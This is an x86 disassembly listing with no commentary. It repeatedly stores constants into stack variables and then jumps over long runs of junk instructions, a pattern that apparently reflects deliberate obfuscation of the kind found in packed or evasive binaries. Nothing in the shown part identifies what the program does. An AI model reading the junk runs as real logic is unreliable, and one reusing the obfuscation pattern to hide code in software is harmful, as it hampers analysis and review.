  417fd4:	mov    DWORD PTR [ebp-0x1c],0x9db
  417fdb:	mov    DWORD PTR [ebp-0x18],0x7
  417fe2:	mov    DWORD PTR [ebp-0x14],0x2a24
  417fe9:	mov    DWORD PTR [ebp-0x10],0x6fd8
  417ff0:	mov    DWORD PTR [ebp-0x24],0x5218
  417ff7:	jmp    0x4180c6
  417ffc:	clc    
  417ffd:	repz pop ecx
  417fff:	stc    
  418000:	pop    ebx
  418001:	sti    
  418002:	clc    
  418003:	repz into 
  418005:	xchg   ebp,eax
  418006:	lock addr16 xchg edx,eax
  418009:	fiadd  DWORD PTR fs:[edx]
  41800c:	rcl    DWORD PTR [ecx],1
  41800e:	add    DWORD PTR [eax],eax
  418010:	mov    dl,0x0
  418012:	add    BYTE PTR [eax],al
  418014:	push   es
  418015:	jbe    0x418025
  418017:	inc    edx
  418018:	cdq    
  418019:	retw   
  41801b:	test   BYTE PTR [ebp-0x52],ch
  41801e:	inc    ecx
  41801f:	sbb    al,0xab
  418021:	fsubr  QWORD PTR [edx]
  418023:	outs   dx,DWORD PTR ds:[esi]
  418024:	test   al,0x62
  418026:	arpl   WORD PTR [edi],ax
  418028:	adc    al,0xd2
  41802a:	mov    ah,0x97
  41802c:	loopne 0x418035
  41802e:	inc    edx
  41802f:	fdivp  st(1),st
  418031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418032:	jnp    0x417fb9
  418034:	and    BYTE PTR [ebp-0x24],0x75
  418038:	nop
  418039:	and    esp,edx
  41803b:	push   ds
  41803c:	or     al,0x29
  41803e:	(bad)  
  41803f:	jnp    0x418072
  418041:	(bad)  
  418042:	outs   dx,BYTE PTR ds:[esi]
  418043:	sti    
  418044:	jo     0x41804a
  418046:	dec    edx
  418047:	test   BYTE PTR [eax+0x53420d1e],bl
  41804d:	xchg   BYTE PTR [eax+0x6a48f8e9],ch
  418053:	cwde   
  418054:	outs   dx,DWORD PTR ds:[esi]
  418055:	jg     0x417fdc
  418057:	ins    DWORD PTR es:[edi],dx
  418058:	fld    QWORD PTR [ecx]
  41805a:	xor    al,0x81
  41805c:	retf   
  41805d:	inc    edx
  41805e:	in     al,0xee
  418060:	jno    0x418085
  418062:	push   ebp
  418063:	(bad)  
  418064:	pusha  
  418065:	popf   
  418066:	pushf  
  418067:	xchg   esp,eax
  418068:	pop    ss
  418069:	fst    QWORD PTR [ecx-0x28]
  41806c:	inc    esi
  41806d:	jne    0x418055
  41806f:	jno    0x418081
  418071:	sub    BYTE PTR [edx],al
  418073:	pop    esi
  418074:	push   cs
  418075:	jbe    0x418039
  418077:	fcomp  QWORD PTR [edx+edx*8-0x2a]
  41807b:	or     DWORD PTR [esp-0x5bcac21b],esp
  418082:	das    
  418083:	in     eax,0x33
  418085:	fstp   DWORD PTR [ecx]
  418087:	inc    esp
  418088:	xor    al,0x4f
  41808a:	cld    
  41808b:	imul   DWORD PTR [edi-0x187fa924]
  418091:	(bad)  [edi-0x74913360]
  418097:	dec    ecx
  418098:	ret    0xa15c
  41809b:	popf   
  41809c:	leave  
  41809d:	scas   eax,DWORD PTR es:[edi]
  41809e:	nop
  41809f:	jb     0x41802e
  4180a1:	pop    ds
  4180a2:	push   ecx
  4180a3:	data16 ins BYTE PTR es:[edi],dx
  4180a5:	out    dx,al
  4180a6:	xchg   DWORD PTR [edi+eiz*1+0x2a4e9a73],ecx
  4180ad:	jl     0x41804f
  4180af:	int3   
  4180b0:	add    esp,DWORD PTR [edi]
  4180b2:	(bad)  
  4180b4:	ret    0x4ef3
  4180b7:	fiadd  DWORD PTR [ebx+0x6a0f9f6d]
  4180bd:	ss jp  0x41804a
  4180c0:	mov    dh,0xfc
  4180c2:	sbb    eax,0xc7b7f97a
  4180c7:	inc    ebp
  4180c8:	fsub   DWORD PTR [esi+0x6d]
  4180cb:	add    BYTE PTR [eax],al
  4180cd:	mov    DWORD PTR [ebp-0x20],0x3469
  4180d4:	mov    DWORD PTR [ebp-0x78],0x5654
  4180db:	jmp    0x4181aa
  4180e0:	cmp    DWORD PTR [esi],eax
  4180e2:	mov    al,ds:0xffffbf7f
  4180e7:	inc    esi
  4180e8:	(bad)  
  4180e9:	xor    dh,BYTE PTR [ecx-0x61]
  4180ec:	adc    DWORD PTR [eax],ecx
  4180ee:	dec    esi
  4180ef:	imul   eax,DWORD PTR [ebx-0x4dfffeee],0xb000000
  4180f9:	pop    eax
  4180fa:	test   DWORD PTR [ecx+0x244fe574],esi
  418100:	ss sub eax,0x719c8e21
  418106:	mov    eax,0xb511f0cc
  41810b:	sar    DWORD PTR [eax],1
  41810d:	mov    cl,al
  41810f:	cmp    BYTE PTR [eax],0x28
  418112:	scas   eax,DWORD PTR es:[edi]
  418113:	jbe    0x418106
  418115:	mov    al,0x76
  418117:	dec    edx
  418118:	adc    eax,0x94227208
  41811d:	push   esp
  41811e:	mov    eax,ds:0x566c177d
  418123:	test   BYTE PTR [edx-0x619c7fbe],bl
  418129:	cmp    al,0x97
  41812b:	adc    al,0xb7
  41812d:	push   edx
  41812e:	gs pop ds
  418130:	cmp    ecx,eax
  418132:	bound  esp,QWORD PTR [edi-0x10]
  418135:	mov    cl,0xca
  418137:	mov    dl,0x9
  418139:	push   cs
  41813a:	mov    esi,0x8bbf40eb
  41813f:	daa    
  418140:	cmp    eax,0x3cb376e5
  418145:	stc    
  418146:	les    eax,FWORD PTR [ecx-0x1ad7318c]
  41814c:	jge    0x418141
  41814e:	stc    
  41814f:	push   cs
  418150:	scas   eax,DWORD PTR es:[edi]
  418151:	jae    0x41813d
  418153:	inc    esi
  418154:	ficomp DWORD PTR [esi+edx*2+0x1527d610]
  41815b:	cli    
  41815c:	iret   
  41815d:	mov    ch,0x94
  41815f:	mov    ch,0x67
  418161:	ror    DWORD PTR [ebx-0x18e499b4],1
  418167:	mov    ah,0xbd
  418169:	dec    esi
  41816a:	fistp  WORD PTR [ebx-0x73103d2e]
  418170:	mov    ebx,0xd46d2ce4
  418175:	push   cs
  418176:	in     al,0x5d
  418178:	dec    eax
  418179:	mov    ecx,0x1208659c
  41817e:	mov    bh,0x42
  418180:	rcl    DWORD PTR [ebp+0x64],1
  418183:	mov    bh,0x6f
  418185:	inc    eax
  418186:	jbe    0x4181c3
  418188:	xchg   ebp,eax
  418189:	pusha  
  41818a:	jle    0x4181bb
  41818c:	lea    eax,ds:0x29eac2bd
  418192:	int3   
  418193:	mov    esi,0x62b0b086
  418198:	push   0xe3d7b470
  41819d:	pop    esp
  41819e:	loop   0x418171
  4181a0:	pop    edx
  4181a1:	sub    DWORD PTR [edi],edi
  4181a3:	lock nop
  4181a5:	jge    0x418175
  4181a7:	jle    0x418207
  4181a9:	pop    ds
  4181aa:	mov    DWORD PTR [ebp-0x74],0x1ca1
  4181b1:	mov    DWORD PTR [ebp-0x70],0x5a50
  4181b8:	jmp    0x418287
  4181bd:	rol    DWORD PTR [edx],0xac
  4181c0:	jne    0x4181b1
  4181c2:	(bad)  
  4181c3:	fnstenv [esi+0x3fead990]
  4181c9:	fcom   DWORD PTR [ebp+edi*2+0x69]
  4181cd:	xor    eax,0xb2000113
  4181d2:	add    BYTE PTR [eax],al
  4181d4:	add    BYTE PTR [eax-0x4a],ch
  4181d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181d8:	not    DWORD PTR [esi-0x685c61da]
  4181de:	in     al,dx
  4181df:	fidivr WORD PTR cs:[edi-0x2f2a2d50]
  4181e6:	xor    BYTE PTR [ebx+ecx*8+0x10d27a30],cl
  4181ed:	hlt    
  4181ee:	lds    ecx,FWORD PTR [edi]
  4181f0:	arpl   WORD PTR [ebx+ebp*4-0x20],si
  4181f4:	xchg   edi,eax
  4181f5:	mov    ds:0xf89b8e24,eax
  4181fa:	push   edi
  4181fb:	inc    edi
  4181fc:	pop    ss
  4181fd:	xor    bl,BYTE PTR [eax+ebp*4+0x63b7850d]
  418204:	inc    esp
  418205:	jle    0x4181c2
  418207:	iret   
  418208:	push   0x3a
  41820a:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41820c:	fistp  QWORD PTR ds:0x50d20ee9
  418212:	dec    esi
  418213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418214:	shl    BYTE PTR [edx+0x5d75526c],1
  41821a:	mov    BYTE PTR [esi+0x464b24c7],bh
  418220:	inc    edx
  418221:	lods   al,BYTE PTR ds:[esi]
  418222:	loop   0x4181ab
  418224:	cmp    eax,0x50c19005
  418229:	cwde   
  41822a:	xor    edx,edx
  41822c:	out    dx,al
  41822d:	in     al,0x7a
  41822f:	mov    ebx,0x42ab530d
  418234:	test   eax,0x33374aed
  418239:	popa   
  41823a:	mov    esp,0x4784efb3
  41823f:	add    eax,0x63ffae11
  418244:	mov    bl,0x1c
  418246:	jp     0x41828a
  418248:	(bad)  
  418249:	mov    ds,WORD PTR [ebp-0x5e681217]
  41824f:	pop    edx
  418250:	xor    ah,BYTE PTR [edx-0x578bafb5]
  418256:	push   ebx
  418257:	test   DWORD PTR [edx],ecx
  418259:	nop
  41825a:	loopne 0x418275
  41825c:	jecxz  0x418287
  41825e:	mov    WORD PTR [eax],es
  418260:	lds    eax,FWORD PTR [ebp-0x1e]
  418263:	push   esi
  418264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418265:	mov    BYTE PTR [edx+0x5f721fe7],dl
  41826b:	call   0x7fd0f18
  418270:	cmp    eax,0x68870c02
  418275:	mov    gs,WORD PTR [ebx+0x3d]
  418278:	stc    
  418279:	iret   
  41827a:	cmp    ecx,DWORD PTR [ecx]
  41827c:	cmp    eax,DWORD PTR [ebx+0x70]
  41827f:	add    al,0x9f
  418281:	scas   al,BYTE PTR es:[edi]
  418282:	imul   eax,DWORD PTR [ebx-0x53],0x66
  418286:	cli    
  418287:	mov    DWORD PTR [ebp-0x6c],0x2769
  41828e:	jmp    0x41835d
  418293:	sahf   
  418294:	pop    ecx
  418295:	or     esi,ebp
  418297:	iret   
  418298:	idiv   esi
  41829a:	jnp    0x418222
  41829c:	lea    eax,ds:0x8d468738
  4182a2:	in     al,0xe7
  4182a4:	adc    eax,DWORD PTR [ecx]
  4182a6:	add    BYTE PTR [edx+0x9000000],dh
  4182ac:	imul   edi,DWORD PTR [ebx],0xfffffff0
  4182af:	jbe    0x41826c
  4182b1:	push   cs
  4182b2:	push   0x57633e7
  4182b7:	aam    0x59
  4182b9:	sbb    esp,DWORD PTR [edx]
  4182bb:	add    al,bl
  4182bd:	xlat   BYTE PTR ds:[ebx]
  4182be:	(bad)  
  4182bf:	test   al,0x78
  4182c1:	ins    BYTE PTR es:[edi],dx
  4182c2:	ja     0x418298
  4182c4:	dec    esi
  4182c5:	dec    esi
  4182c6:	mov    ecx,0x2f4f1b97
  4182cb:	iret   
  4182cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182cd:	sbb    edx,DWORD PTR [ecx]
  4182cf:	add    eax,0x1a6b5cbc
  4182d4:	fdivr  st,st(3)
  4182d6:	ror    BYTE PTR [ecx+0x433b31c],cl
  4182dc:	arpl   WORD PTR [ebp+0x5bc2598e],di
  4182e2:	inc    ebp
  4182e3:	call   0x758cd03
  4182e8:	(bad)  
  4182e9:	or     eax,0x3d21342
  4182ee:	ins    DWORD PTR es:[edi],dx
  4182ef:	xchg   esp,ebx
  4182f1:	push   0xffffffb8
  4182f3:	or     edi,eax
  4182f5:	add    al,0x63
  4182f7:	inc    ebp
  4182f8:	cmc    
  4182f9:	out    dx,eax
  4182fa:	int3   
  4182fb:	(bad)  
  4182fc:	pop    ecx
  4182fd:	dec    eax
  4182fe:	pop    ds
  4182ff:	arpl   WORD PTR [ecx],di
  418301:	xor    al,dh
  418303:	pusha  
  418304:	jo     0x418317
  418306:	mov    ecx,0x564ee1f
  41830b:	int    0x97
  41830d:	mov    BYTE PTR [edi-0x7212ff83],bh
  418313:	out    0xeb,eax
  418315:	pop    ecx
  418316:	fnstsw WORD PTR [ebp-0x23]
  418319:	push   cs
  41831a:	cli    
  41831b:	mov    eax,ds:0x246bcf30
  418320:	push   0xf516c45c
  418325:	sbb    DWORD PTR [esi+0xb],0x42278fbd
  41832c:	xlat   BYTE PTR ds:[ebx]
  41832d:	out    dx,al
  41832e:	in     eax,0xd5
  418330:	mov    ebx,0xf5e5f6ee
  418335:	and    eax,0x1d214619
  41833a:	sbb    BYTE PTR [edx-0x3bc7e93a],dl
  418340:	dec    esi
  418341:	mov    esp,0x12e51234
  418346:	dec    edi
  418347:	sbb    ebx,DWORD PTR [eax+0x1f]
  41834a:	cld    
  41834b:	das    
  41834c:	fcmovne st,st(5)
  41834e:	push   0x18
  418350:	fdiv   QWORD PTR [eax+0x5f]
  418353:	aad    0x4f
  418355:	ret    
  418356:	jne    0x4182ed
  418358:	inc    edi
  418359:	je     0x4183c7
  41835b:	int    0x90
  41835d:	mov    DWORD PTR [ebp-0x68],0x269a
  418364:	mov    DWORD PTR [ebp-0x64],0x4813
  41836b:	jmp    0x41843a
  418370:	cmp    al,0x8e
  418372:	into   
  418373:	data16 (bad) 
  418375:	mov    sp,0xd8de
  418379:	sbb    dh,dh
  41837b:	adc    DWORD PTR [ebx-0x6b],esi
  41837e:	add    BYTE PTR [esi-0x67],cl
  418381:	adc    al,0x1
  418383:	add    BYTE PTR [edx-0x2a000000],dh
  418389:	cmp    ch,BYTE PTR [esi]
  41838b:	mov    ebp,0xd2d8eb08
  418390:	xchg   esp,eax
  418391:	loope  0x418377
  418393:	add    eax,0x73927926
  418398:	aas    
  418399:	mov    cs,WORD PTR [esp+ecx*8-0x14baeab4]
  4183a0:	ja     0x418360
  4183a2:	mov    al,ds:0x739ce03a
  4183a7:	loop   0x4183f4
  4183a9:	mov    ebx,0xd5ed536f
  4183ae:	daa    
  4183af:	xlat   BYTE PTR ds:[ebx]
  4183b0:	sub    DWORD PTR [edx+0x33],ecx
  4183b3:	popf   
  4183b4:	ret    
  4183b5:	mov    BYTE PTR ds:0x3b1a908a,cl
  4183bb:	add    ah,0x6b
  4183be:	dec    edx
  4183bf:	jae    0x4183fd
  4183c1:	xchg   ebx,eax
  4183c2:	xchg   BYTE PTR ds:0x92e50b8,bh
  4183c8:	das    
  4183c9:	(bad)  
  4183ca:	pop    esp
  4183cb:	aas    
  4183cc:	push   ecx
  4183cd:	jmp    0x51e1c35c
  4183d2:	xor    ebx,esp
  4183d4:	ficom  DWORD PTR [eax-0x44]
  4183d7:	push   eax
  4183d8:	aaa    
  4183d9:	stc    
  4183da:	push   ds
  4183db:	or     BYTE PTR [bx+si],bl
  4183de:	adc    bl,BYTE PTR [edi+0x62541783]
  4183e4:	jmp    0x4183fb
  4183e6:	dec    ebx
  4183e7:	jnp    0x4183ea
  4183e9:	jae    0x41842a
  4183eb:	mov    eax,0x266cc1ba
  4183f0:	inc    eax
  4183f1:	es mov esi,0x91729b20
  4183f7:	mov    edi,DWORD PTR [ecx+0x16a35e7c]
  4183fd:	xchg   BYTE PTR [edi],cl
  4183ff:	mov    ds:0x563fdc07,eax
  418404:	psrlq  mm7,QWORD PTR [ecx-0x6d78bd66]
  41840b:	jecxz  0x418443
  41840d:	mov    eax,ecx
  41840f:	scas   al,BYTE PTR es:[edi]
  418410:	jg     0x41843c
  418412:	daa    
  418413:	or     ah,al
  418415:	xor    edi,DWORD PTR [ebp-0x41]
  418418:	call   0x122baf5e
  41841d:	(bad)  
  41841e:	xchg   ebp,eax
  41841f:	mov    esp,0xb12d2502
  418424:	enter  0xfb92,0xbf
  418428:	pop    es
  418429:	jp     0x418458
  41842b:	loop   0x4183d0
  41842d:	mov    ecx,0x14965801
  418432:	jecxz  0x4184af
  418434:	aaa    
  418435:	imul   esi,DWORD PTR [eax],0xc76af73d
  41843b:	inc    ebp
  41843c:	int3   
  41843d:	pop    ds
  41843e:	adc    eax,DWORD PTR [eax]
  418440:	add    bh,al
  418442:	inc    ebp
  418443:	sar    BYTE PTR [edi+eiz*4],1
  418446:	add    eax,DWORD PTR [eax]
  418448:	mov    DWORD PTR [ebp-0x2c],0x27ca
  41844f:	mov    ecx,DWORD PTR [ebp-0x40]
  418452:	mov    esi,DWORD PTR [ebp-0x3c]
  418455:	mov    eax,DWORD PTR [ebp-0x48]
  418458:	mov    edx,DWORD PTR [ebp-0x44]
  41845b:	add    ecx,0xffffa9e2
  418461:	adc    esi,0xfffffe95
  418467:	jmp    0x418536
  41846c:	mov    ds:0xed2f8cc6,eax
  418471:	outs   dx,DWORD PTR ds:[esi]
  418472:	mov    ds:0x595df7ce,eax
  418477:	faddp  st(2),st
  418479:	dec    esp
  41847a:	dec    ebx
  41847b:	mov    esp,0x1154b
  418480:	mov    dl,0x0
  418482:	add    BYTE PTR [eax],al
  418484:	xor    bl,dl
  418486:	popa   
  418487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418488:	aas    
  418489:	add    edi,eax
  41848b:	dec    edx
  41848c:	and    BYTE PTR [esi],ah
  41848e:	adc    BYTE PTR [esi],bh
  418490:	jmp    0x41849b
  418492:	mov    eax,0xc274d89b
  418497:	mov    ch,0x7b
  418499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41849a:	inc    edi
  41849b:	sub    bh,dl
  41849d:	inc    edx
  41849e:	test   al,0xbf
  4184a0:	jmp    0x19ca:0xa389855
  4184a7:	call   esp
  4184a9:	fwait
  4184aa:	loope  0x418443
  4184ac:	mov    ecx,0x1d606172
  4184b1:	cmp    al,0x71
  4184b3:	int3   
  4184b4:	mov    eax,ds:0xca19f01c
  4184b9:	div    BYTE PTR [edi-0x340c452f]
  4184bf:	gs inc ebp
  4184c1:	stos   DWORD PTR es:[edi],eax
  4184c2:	rcr    DWORD PTR [ebx],1
  4184c4:	out    dx,eax
  4184c5:	sbb    al,0xd2
  4184c7:	add    BYTE PTR [esi-0x66],0x5d
  4184cb:	cmp    BYTE PTR [edi-0x3ffecb06],cl
  4184d1:	xchg   esp,eax
  4184d2:	lock mov al,0x8a
  4184d5:	rol    DWORD PTR [eax+0x1e63c1b5],1
  4184db:	(bad)
  4184df:	jge    0x4184fe
  4184e1:	inc    ebp
  4184e2:	push   0xd878e931
  4184e7:	add    bl,ah
  4184e9:	imul   edi,DWORD PTR [edx],0xfffffff5
  4184ec:	test   DWORD PTR [eax-0x45aa6666],0x4093553f
  4184f6:	pop    edx
  4184f7:	adc    BYTE PTR ss:[eax-0x10315b5e],ch
  4184fe:	cmc    
  4184ff:	xchg   edx,eax
  418500:	cmp    eax,0x49cccff8
  418505:	rol    dh,1
  418507:	mov    DWORD PTR [edi+0x1b761c1f],ebx
  41850d:	(bad)  
  41850e:	mov    ah,0xa5
  418510:	loopne 0x41854f
  418512:	ins    DWORD PTR es:[edi],dx
  418513:	inc    ecx
  418514:	dec    ebp
  418515:	repnz ins BYTE PTR es:[edi],dx
  418517:	xor    esi,DWORD PTR [edi-0x7e]
  41851a:	push   edi
  41851b:	es iret 
  41851d:	inc    eax
  41851e:	cs jmp 0xfeaba78b
  418524:	xchg   BYTE PTR [ecx+0x25],al
  418527:	xor    ebp,ebp
  418529:	push   ebx
  41852a:	push   edi
  41852b:	bswap  esp
  41852d:	add    al,0x7a
  41852f:	pop    edx
  418530:	jb     0x4184f8
  418532:	push   ds
  418533:	loop   0x4184cf
  418535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418536:	and    ecx,eax
  418538:	jmp    0x418607
  41853d:	aas    
  41853e:	dec    esi
  41853f:	out    dx,eax
  418540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418541:	jmp    DWORD PTR [ebp+0x19cddf7f]
  418547:	cmp    BYTE PTR [edi+0x7ab9ee24],0xfd
  41854e:	adc    eax,0xb20001
  418553:	add    BYTE PTR [eax],al
  418555:	adc    edx,DWORD PTR [esi]
  418557:	pop    ds
  418558:	(bad)  
  41855b:	and    al,0x4a
  41855d:	dec    ebp
  41855e:	fldpi  
  418560:	and    eax,0xf773f2b7
  418565:	imul   edi,DWORD PTR [eax-0x4f1eb150],0xffffff83
  41856c:	ss (bad) 
  41856f:	push   ss
  418570:	xchg   ebx,eax
  418571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418572:	mov    al,0xc8
  418574:	push   es
  418575:	jmp    ebx
  418577:	adc    esi,DWORD PTR [ebp+0x15007265]
  41857d:	and    BYTE PTR [ebx+0x2c],cl
  418580:	jmp    0x127c:0xadba4638
  418587:	or     cl,BYTE PTR [ebp+0x63]
  41858a:	xchg   ebp,eax
  41858b:	out    dx,al
  41858c:	jp     0x41858d
  41858e:	fwait
  41858f:	xor    BYTE PTR [esi],cl
  418591:	and    dl,BYTE PTR [ebx]
  418593:	dec    ecx
  418594:	out    0xba,eax
  418596:	lea    edx,[ebx-0x4d]
  418599:	pop    DWORD PTR [ebx]
  41859b:	int    0x2
  41859d:	xchg   ecx,eax
  41859e:	or     eax,0xf71f8f3d
  4185a3:	jmp    0x70fe0614
  4185a8:	mov    edx,0x41edee11
  4185ad:	in     eax,0xc
  4185af:	cdq    
  4185b0:	js     0x4185ab
  4185b2:	dec    esi
  4185b3:	cdq    
  4185b4:	inc    eax
  4185b5:	jnp    0x418566
  4185b7:	inc    ebx
  4185b8:	xlat   BYTE PTR ds:[ebx]
  4185b9:	or     BYTE PTR [ecx+0xb941e4b],dh
  4185bf:	sti    
  4185c0:	push   0x2a
  4185c2:	imul   ebx,DWORD PTR [ecx],0x6677ed4e
  4185c8:	and    eax,0xb99c2cde
  4185cd:	cmp    ebp,DWORD PTR [esi-0x7b98dac8]
  4185d3:	sbb    esi,DWORD PTR [ebx+0x61]
  4185d6:	sbb    BYTE PTR [edx+0x5b],ah
  4185d9:	pop    ecx
  4185da:	ret    
  4185db:	retf   0xaf9f
  4185de:	out    dx,al
  4185df:	lods   eax,DWORD PTR ds:[esi]
  4185e0:	dec    ebp
  4185e1:	rol    BYTE PTR [edi],0xee
  4185e4:	dec    esp
  4185e5:	leave  
  4185e6:	daa    
  4185e7:	add    edi,DWORD PTR [eax+esi*2]
  4185ea:	retf   0x288b
  4185ed:	data16 jae 0x418637
  4185f0:	daa    
  4185f1:	push   0xffffff86
  4185f3:	dec    esi
  4185f4:	jne    0x4185f4
  4185f6:	mov    ch,0x75
  4185f8:	test   al,0xe4
  4185fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185fb:	adc    DWORD PTR [eax+0x16be2f73],edx
  418601:	pusha  
  418602:	mov    bh,0xf8
  418604:	pop    edi
  418605:	and    bl,BYTE PTR [edx+0x23b0458b]
  41860b:	repnz mov edx,DWORD PTR [ebp-0x4c]
  41860f:	jmp    0x4186de
  418614:	push   ebx
  418615:	data16 or BYTE PTR [ebp+edi*1+0x6e],ch
  41861a:	ja     0x41869b
  41861c:	adc    ch,BYTE PTR [edx-0x528dc03b]
  418622:	clc    
  418623:	mov    eax,ds:0x116af
  418628:	mov    dl,0x0
  41862a:	add    BYTE PTR [eax],al
  41862c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41862d:	addr16 mov al,0xe3
  418630:	fild   DWORD PTR [ebp+0x5b]
  418633:	sub    eax,0xe1585172
  418638:	fstp   QWORD PTR [esi]
  41863a:	imul   eax,DWORD PTR [ebp-0x5b],0xffffffee
  41863e:	pop    es
  41863f:	icebp  
  418640:	dec    eax
  418641:	jmp    0x4186ad
  418643:	adc    eax,0x4db23a8b
  418648:	sar    DWORD PTR [ebx+0x342645e],1
  41864e:	mov    cl,0xad
  418650:	sbb    edx,edi
  418652:	out    dx,eax
  418653:	out    0xbe,eax
  418655:	fdivr  DWORD PTR [ecx]
  418657:	add    edi,DWORD PTR [ecx]
  418659:	add    dh,al
  41865b:	imul   ebx,DWORD PTR [edx+0x77],0x6
  41865f:	lods   eax,DWORD PTR ds:[esi]
  418660:	xor    ch,BYTE PTR [esp+esi*2-0x981dc71]
  418667:	fucomip st,st(6)
  418669:	out    0xd8,al
  41866b:	iret   
  41866c:	and    ah,BYTE PTR [edx]
  41866e:	and    BYTE PTR [edi-0x8],dl
  418671:	sbb    eax,0xa124b643
  418676:	in     eax,0x32
  418678:	aam    0x14
  41867a:	inc    ebp
  41867b:	pushf  
  41867c:	fdivr  DWORD PTR [esi+edx*2]
  41867f:	or     edi,DWORD PTR [edi+0x57]
  418682:	dec    esi
  418683:	and    eax,0xda2e9c91
  418688:	fwait
  418689:	pop    ss
  41868a:	pusha  
  41868b:	outs   dx,BYTE PTR ds:[esi]
  41868c:	add    bl,BYTE PTR ds:[ecx-0x6b]
  418690:	ja     0x4186c3
  418692:	sub    BYTE PTR [eax+0x6],cl
  418695:	mov    dl,0x6d
  418697:	jb     0x4186f4
  418699:	adc    ebp,DWORD PTR ds:0x33e21d8f
  41869f:	ja     0x418659
  4186a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186a2:	dec    esi
  4186a3:	mov    esi,DWORD PTR ds:0xe096c503
  4186a9:	xor    ecx,ebx
  4186ab:	sbb    al,0x73
  4186ad:	loopne 0x4186b8
  4186af:	and    eax,0x3e07e8ac
  4186b4:	push   edx
  4186b5:	psllw  mm0,QWORD PTR [ebx+0x22]
  4186b9:	retf   0x2966
  4186bc:	sub    al,0xe6
  4186be:	cmp    ebx,DWORD PTR [esi-0x7ebeb2b9]
  4186c4:	mov    edi,DWORD PTR ds:0x86672b6
  4186ca:	inc    ebp
  4186cb:	(bad)
  4186ce:	arpl   WORD PTR [edi+0x6b],cx
  4186d1:	aad    0x16
  4186d3:	scas   al,BYTE PTR es:[edi]
  4186d4:	sti    
  4186d5:	out    0x79,eax
  4186d7:	cs das 
  4186d9:	rcr    cl,cl
  4186db:	xchg   ebx,eax
  4186dc:	js     0x418665
  4186de:	sub    ecx,eax
  4186e0:	mov    eax,ds:0x42f1b4
  4186e5:	mov    eax,DWORD PTR [eax+0x1c8]
  4186eb:	mov    eax,DWORD PTR [eax]
  4186ed:	sbb    esi,edx
  4186ef:	add    ecx,0x11f5
  4186f5:	cdq    
  4186f6:	jmp    0x4187c5
  4186fb:	(bad)  
  4186fd:	shl    BYTE PTR ds:0xffff2ff0,1
  418703:	inc    edx
  418704:	cmp    ah,0xe4
  418707:	leave  
  418708:	jmp    0x1:0x1761c310
  41870f:	mov    dl,0x0
  418711:	add    BYTE PTR [eax],al
  418713:	xor    eax,0x9945e2ae
  418719:	jae    0x4186d0
  41871b:	scas   eax,DWORD PTR es:[edi]
  41871c:	(bad)  
  41871d:	push   ecx
  41871e:	pop    ss
  41871f:	xor    eax,0xede9f83a
  418724:	add    al,0xff
  418726:	mov    al,0xc0
  418728:	pop    ss
  418729:	(bad)  
  41872a:	cmp    ch,BYTE PTR [ecx+0x33]
  41872d:	mov    fs,WORD PTR [ecx-0x15]
  418730:	imul   BYTE PTR [edx+ebp*2]
  418733:	sub    al,dl
  418735:	aas    
  418736:	int3   
  418737:	hlt    
  418738:	push   0x167a9231
  41873d:	outs   dx,BYTE PTR ds:[esi]
  41873e:	out    0x35,eax
  418740:	sub    ebx,ebp
  418742:	and    edx,ebp
  418744:	pop    edi
  418745:	xchg   ecx,edx
  418747:	sahf   
  418748:	pop    es
  418749:	cdq    
  41874a:	sbb    al,0xaa
  41874c:	lds    ebx,FWORD PTR [edx+0x4d20a436]
  418752:	push   ebp
  418753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418754:	je     0x418724
  418756:	jle    0x4186f7
  418758:	aaa    
  418759:	mov    BYTE PTR [eax-0x45b260d5],bh
  41875f:	jecxz  0x418719
  418761:	mov    ebp,0xe1235d9c
  418766:	inc    ebx
  418767:	xlat   BYTE PTR ds:[ebx]
  418768:	adc    DWORD PTR [ebp-0x2a],edi
  41876b:	ds retf 0x4e82
  41876f:	idiv   BYTE PTR [edx+0x17]
  418772:	data16 ja 0x4187b9
  418775:	stos   BYTE PTR es:[edi],al
  418776:	outs   dx,BYTE PTR ds:[esi]
  418777:	jle    0x418778
  418779:	pop    esi
  41877a:	stos   BYTE PTR es:[edi],al
  41877b:	fcom   DWORD PTR [eax]
  41877d:	pop    ds
  41877e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41877f:	in     eax,dx
  418780:	shl    DWORD PTR [edx],1
  418782:	aam    0xcd
  418784:	inc    ecx
  418785:	fidiv  WORD PTR [ebx+0x26]
  418788:	fsubr  QWORD PTR [edx-0x27e182c]
  41878e:	bound  ebp,QWORD PTR [edx-0x7130ca8]
  418794:	xor    dh,bh
  418796:	scas   eax,DWORD PTR es:[edi]
  418797:	test   DWORD PTR [ebx-0x3113dfc0],0xc833789d
  4187a1:	sbb    edx,esi
  4187a3:	fdivrp st(2),st
  4187a5:	pop    ebx
  4187a6:	pushf  
  4187a7:	xor    DWORD PTR [ecx-0x5a],esi
  4187aa:	lds    ecx,FWORD PTR [ebx-0x4b]
  4187ad:	test   BYTE PTR [edx+0x2c],0xe
  4187b1:	rol    BYTE PTR [eax-0x1],1
  4187b4:	sub    dl,BYTE PTR [ecx+0x64]
  4187b7:	in     eax,0x15
  4187b9:	push   ebp
  4187ba:	xchg   ecx,eax
  4187bb:	je     0x4187b9
  4187bd:	popf   
  4187be:	inc    ebx
  4187bf:	aaa    
  4187c0:	imul   esp,DWORD PTR [ecx+ebx*1-0x297e5dac],0x4aad
  4187cb:	cmp    eax,ecx
  4187cd:	jne    0x4188aa
  4187d3:	cmp    edx,esi
  4187d5:	jmp    0x4188a4
  4187da:	cmp    BYTE PTR [ebp+0x7b],0xd4
  4187de:	call   esi
  4187e0:	scas   eax,DWORD PTR es:[edi]
  4187e1:	jge    0x418852
  4187e3:	cmp    dh,ah
  4187e5:	xchg   edx,eax
  4187e6:	ds pop ss
